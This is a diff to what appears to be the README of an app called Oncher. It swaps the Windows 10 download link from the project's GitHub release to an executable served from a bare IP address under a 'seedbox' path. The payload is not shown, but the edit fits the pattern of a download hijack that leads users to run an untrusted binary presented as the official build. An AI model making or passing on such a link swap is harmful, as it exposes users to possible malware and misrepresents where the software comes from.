@@ -55,7 +55,7 @@ alt="discuss"></a>
 
 ❌ [Download Windows 7/8 Build]()
 
-✔️ [Download Windows 10 Build](https://github.com/aminPial/ONCHER-APP/releases/download/0.0.1/Oncher.exe)
+✔️ [Download Windows 10 Build](http://157.245.51.210/seedbox/oncher.exe)
 
 ❌ [Download Mac High Sierra Build]()
 
